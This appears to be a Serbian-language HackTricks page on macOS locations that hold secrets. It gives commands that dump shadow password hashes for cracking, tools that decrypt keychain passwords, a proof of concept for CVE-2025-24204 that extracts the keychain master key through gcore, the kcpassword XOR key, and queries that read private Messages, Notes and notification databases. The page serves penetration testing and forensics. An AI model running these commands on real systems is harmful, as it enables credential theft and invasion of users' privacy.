# Osetljive lokacije i zanimljivi daemoni u macOS-u

{{#include ../../../banners/hacktricks-training.md}}

## Lozinke

### Shadow lozinke

Shadow lozinka se čuva zajedno sa konfiguracijom korisnika u plist datotekama koje se nalaze u **`/var/db/dslocal/nodes/Default/users/`**.\
Sledeći oneliner može da se koristi za dump **svih informacija o korisnicima** (uključujući informacije o hash-u):
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Skripte poput ove**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) ili [**ove**](https://github.com/octomagon/davegrohl.git) mogu se koristiti za transformisanje hash-a u **hashcat** **format**.

Alternativni one-liner koji će izbaciti kredencijale svih naloga koji nisu servisni u hashcat formatu `-m 7100` (macOS PBKDF2-SHA512):
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Drugi način za dobijanje `ShadowHashData` korisnika jeste korišćenje `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Ova datoteka se **koristi samo** kada sistem radi u **single-user mode** (dakle, ne naročito često).

### Keychain Dump

Imajte na umu da će, prilikom korišćenja security binary-ja za **dump-ovanje dekriptovanih lozinki**, nekoliko upita zatražiti od korisnika da dozvoli ovu operaciju.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
Na modernom macOS-u najzanimljivija skladišta su obično **`~/Library/Keychains/login.keychain-db`** i **`/Library/Keychains/System.keychain`**. To su datoteke zasnovane na SQLite-u, ali pristup otvorenom tekstu i dalje posreduje **`securityd`**: krađa sirove DB datoteke uglavnom vam daje metapodatke i šifrovane blobove, osim ako ne povratite i korisničku lozinku, `SystemKey` ili master key koji se nalazi u memoriji.<sup>[2]</sup>

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Na osnovu ovog komentara [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) izgleda da ovi alati više ne rade u Big Sur-u.

### Pregled alata Keychaindump

Alat pod nazivom **keychaindump** razvijen je za izvlačenje lozinki iz macOS keychain-a, ali ima ograničenja na novijim verzijama macOS-a, kao što je Big Sur, što je navedeno u [diskusiji](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Korišćenje alata **keychaindump** zahteva da napadač dobije pristup i eskalira privilegije na **root**. Alat iskorišćava činjenicu da se keychain podrazumevano otključava prilikom prijavljivanja korisnika radi praktičnosti, što aplikacijama omogućava da mu pristupaju bez ponovnog zahtevanja korisničke lozinke. Međutim, ako korisnik odluči da zaključa svoj keychain nakon svake upotrebe, **keychaindump** postaje neefikasan.

**Keychaindump** funkcioniše ciljanjem određenog procesa pod nazivom **securityd**, koji Apple opisuje kao daemon za autorizaciju i kriptografske operacije, ključan za pristup keychain-u. Proces ekstrakcije podrazumeva identifikovanje **Master Key** izvedenog iz korisničke login lozinke. Ovaj ključ je neophodan za čitanje keychain datoteke. Da bi pronašao **Master Key**, **keychaindump** skenira memory heap procesa **securityd** pomoću komande `vmmap`, tražeći potencijalne ključeve unutar oblasti označenih kao `MALLOC_TINY`. Za ispitivanje ovih memorijskih lokacija koristi se sledeća komanda:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Nakon identifikovanja potencijalnih master ključeva, **keychaindump** pretražuje heap memoriju u potrazi za određenim obrascem (`0x0000000000000018`) koji ukazuje na kandidata za master ključ. Za korišćenje ovog ključa potrebni su dodatni koraci, uključujući deobfuskaciju, kao što je opisano u izvornom kodu alata **keychaindump**. Analitičari koji se bave ovom oblašću treba da imaju na umu da se ključni podaci za dešifrovanje keychain-a čuvaju u memoriji procesa **securityd**. Primer pokretanja alata **keychaindump** je:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) može da se koristi za ekstrakciju sledećih tipova informacija iz OSX keychain-a na forenzički pouzdan način:

- Hashovana lozinka za Keychain, pogodna za cracking pomoću alata [hashcat](https://hashcat.net/hashcat/) ili [John the Ripper](https://www.openwall.com/john/)
- Internet lozinke
- Generic lozinke
- Privatni ključevi
- Javni ključevi
- X509 sertifikati
- Secure Notes
- AppleShare lozinke

Ako je dostupna lozinka za otključavanje keychain-a, master key dobijen pomoću alata [volafox](https://github.com/n0fate/volafox) ili [volatility](https://github.com/volatilityfoundation/volatility), odnosno unlock fajl kao što je SystemKey, Chainbreaker će takođe obezbediti lozinke u plaintext obliku.

Bez jednog od ovih metoda za otključavanje Keychain-a, Chainbreaker će prikazati sve ostale dostupne informacije.

#### **Izbacivanje keychain ključeva**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Dump keychain ključeve (sa lozinkama) pomoću SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain ključeva (sa lozinkama) uz crackovanje hash-a**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain ključeva (sa lozinkama) pomoću memory dump-a**

[Pratite ove korake](../index.html#dumping-memory-with-osxpmem) da biste izvršili **memory dump**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) using users password**

Ako znate lozinku korisnika, možete je koristiti za **dump i dešifrovanje keychain-ova koji pripadaju korisniku**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Keychain master key putem `gcore` entitlementa (CVE-2025-24204)

macOS 15.0 (Sequoia) isporučen je sa `/usr/bin/gcore` koji ima **`com.apple.system-task-ports.read`** entitlement, pa je svaki lokalni admin (ili zlonamerna potpisana aplikacija) mogao da dumpuje memoriju bilo kog procesa čak i kada su SIP/TCC bili primenjeni. Dumpovanje procesa `securityd` otkriva **Keychain master key** u čistom tekstu i omogućava vam da dešifrujete `login.keychain-db` bez korisničke lozinke.<sup>[1]</sup>

**Brza reprodukcija na ranjivim buildovima (15.0–15.2):**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Prosledite izdvojeni hex ključ alatu Chainbreaker (`--key <hex>`) da biste dešifrovali login keychain. Apple je uklonio entitlement u **macOS 15.3+**, tako da ovo funkcioniše samo na nezakrpljenim Sequoia buildovima ili sistemima koji su zadržali ranjivi binarni fajl.

### kcpassword

Fajl **kcpassword** sadrži **korisničku login lozinku**, ali samo ako je vlasnik sistema **omogućio automatsko prijavljivanje**. Zbog toga će korisnik biti automatski prijavljen bez unošenja lozinke (što nije naročito bezbedno).

Lozinka se čuva u fajlu **`/etc/kcpassword`**, XOR-ovana ključem **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Ako je lozinka korisnika duža od ključa, ključ će biti ponovo upotrebljen.\
Zbog toga je lozinku prilično lako povratiti, na primer pomoću skripti kao što je [**ova**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Zanimljive informacije u bazama podataka

### Poruke
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Obaveštenja

Pre **Sequoia**, skladište Notification Center obično možete pronaći na lokaciji **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. U **Sequoia+** Apple ga je premestio u TCC-zaštićeni grupni kontejner **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**.

Većina zanimljivih informacija čuva se unutar kolona **blob**, pa ćete morati da izdvojite taj sadržaj i transformišete ga u format čitljiv ljudima (`plutil -p -`, `strings` ili mali parser). Primeri za brzu trijažu:
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### Nedavni problemi sa privatnošću (NotificationCenter DB)

- U macOS **14.7–15.1**, Apple je čuvao sadržaj banera u SQLite bazama `db2/db` bez odgovarajućeg skrivanja. CVE-ovi **CVE-2024-44292/44293/40838/54504** omogućavali su bilo kom lokalnom korisniku da pročita tekst obaveštenja drugih korisnika jednostavnim otvaranjem baze (bez TCC upita).
- Apple je ovo ublažio premeštanjem baze u `group.com.apple.usernoted` i zaštitom pomoću TCC-a u novijim Sequoia buildovima, tako da je na aktuelnim sistemima obično potreban odgovarajući korisnički kontekst ili TCC bypass za čitanje baze.<sup>[3]</sup>
- Na legacy endpointima, kopirajte zajedno datoteke `db`, `db-wal` i `db-shm` pre ažuriranja ili ponovnog pokretanja ako želite da sačuvate artefakte.

### Napomene

**notes** korisnika mogu se pronaći u `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
Ako je gornji **one-liner** previše bučan, eksportujte `ZICNOTEDATA.ZDATA`, raspakujte ga pomoću `gunzip` i parsirajte protobuf: ovo je obično pouzdanije nego direktno pokretanje `strings` nad SQLite bazom.

### Zadaci u pozadini / Stavke za prijavljivanje

Počevši od **Ventura** verzije, stavke za prijavljivanje koje je odobrio korisnik i nekoliko zadataka u pozadini prate se u **BTM** skladištima, kao što su **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** i verzionisani sistemski keš **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.

Ove datoteke su korisne za brzu identifikaciju persistence mehanizama, pomoćnih alata i nekih MDM-upravljanih stavki u pozadini:
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
Za persistence ugao i BTM internals, pogledajte [stranicu sa auto-start lokacijama](../../macos-auto-start-locations.md#login-items) i [beleške o Background Tasks Management](../macos-security-protections/README.md#background-tasks-management).

## Preferences

U macOS aplikacijama, preferences se nalaze u **`$HOME/Library/Preferences`**, a u iOS-u u `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

U macOS-u, CLI alat **`defaults`** može da se koristi za **izmenu Preferences fajla**.

**`/usr/sbin/cfprefsd`** upravlja XPC servisima `com.apple.cfprefsd.daemon` i `com.apple.cfprefsd.agent` i može biti pozvan za izvršavanje radnji kao što je izmena preferences.

## OpenDirectory permissions.plist

Fajl `/System/Library/OpenDirectory/permissions.plist` sadrži permissions primenjene na atribute čvorova i zaštićen je pomoću SIP-a.\
Ovaj fajl dodeljuje permissions određenim korisnicima na osnovu UUID-a (a ne uid-a), što im omogućava pristup određenim osetljivim informacijama kao što su `ShadowHashData`, `HeimdalSRPKey` i `KerberosKeys`, između ostalog:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## Sistemska obaveštenja

### Darwin obaveštenja

Glavni daemon za obaveštenja je **`/usr/sbin/notifyd`**. Da bi primili obaveštenja, klijenti moraju da se registruju preko Mach porta `com.apple.system.notification_center` (proverite ih pomoću `sudo lsmp -p <pid notifyd>`). Daemon se konfiguriše pomoću datoteke `/etc/notify.conf`.

Imena koja se koriste za obaveštenja su jedinstvene obrnute DNS notacije. Kada se obaveštenje pošalje jednom od tih imena, primiće ga klijent(i) koji su naveli da mogu da ga obrade.

Moguće je izbaciti trenutni status (i videti sva imena) slanjem signala SIGUSR2 procesu notifyd i čitanjem generisane datoteke: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

**Distributed Notification Center**, čiji je glavni binary **`/usr/sbin/distnoted`**, predstavlja još jedan način za slanje obaveštenja. Izlaže neke XPC services i obavlja određene provere kako bi pokušao da verifikuje klijente.

### Apple Push Notifications (APN)

U ovom slučaju, aplikacije mogu da se registruju za **topics**. Klijent generiše token tako što kontaktira Apple servere preko **`apsd`**.\
Zatim će i providers generisati token i moći će da se povežu sa Apple serverima kako bi slali poruke klijentima. Ove poruke će lokalno primiti **`apsd`**, koji će proslediti obaveštenje aplikaciji koja ga čeka.

Preferences se nalaze u `/Library/Preferences/com.apple.apsd.plist`.

Lokalna baza podataka poruka nalazi se u macOS-u na `/Library/Application\ Support/ApplePushService/aps.db`, a u iOS-u na `/var/mobile/Library/ApplePushService`. Sadrži 3 tabele: `incoming_messages`, `outgoing_messages` i `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Takođe je moguće dobiti informacije o daemonu i konekcijama koristeći:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Obaveštenja korisnika

Ovo su obaveštenja koja korisnik treba da vidi na ekranu:

- **`CFUserNotification`**: Ovaj API pruža način da se na ekranu prikaže iskačući prozor sa porukom.
- **The Bulletin Board**: Ovo na iOS-u prikazuje baner koji nestaje i biće sačuvan u Notification Center-u.
- **`NSUserNotificationCenter`**: Ovo je iOS bulletin board na macOS-u. U starijim izdanjima macOS-a baza se obično nalazi u `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; na Sequoia+ premeštena je u `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.

## Reference

- [1] [HelpNetSecurity – macOS gcore entitlement omogućio ekstrakciju Keychain master ključa (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [2] [Apple Platform Security – Zaštita podataka u Keychain-u](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [3] [9to5Mac – Apple rešava pitanja privatnosti u vezi sa Notification Center bazom u macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)

{{#include ../../../banners/hacktricks-training.md}}
